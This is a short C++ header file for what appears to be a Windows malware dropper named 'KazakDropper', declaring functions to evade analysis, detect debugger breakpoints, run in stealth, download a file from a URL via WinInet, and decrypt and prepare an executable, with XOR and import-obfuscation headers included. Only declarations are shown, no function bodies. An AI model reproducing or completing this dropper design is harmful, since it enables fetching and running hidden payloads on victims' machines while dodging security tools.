#pragma once

#include <Windows.h>
#include <string>
#include <iostream>
#include <filesystem>
#include <thread>
#include <WinInet.h>

#include "../headers/obfuscation/li.h"
#include "../headers/obfuscation/xor.h"

#pragma comment(lib,"WinInet.lib")

struct Storage
{
	std::string DecryptedBytes;
	std::string BytesStorage;
	std::string Key;

};

namespace KazakDropper
{
	bool EvadeAnalysis();
	BOOL IsBp(const char* lpszModule, const char* lpszFunction);

	void Stealth();
	void PrepareExe();
}

namespace KazakUtils
{
	std::string FileToString(std::wstring URL);
}
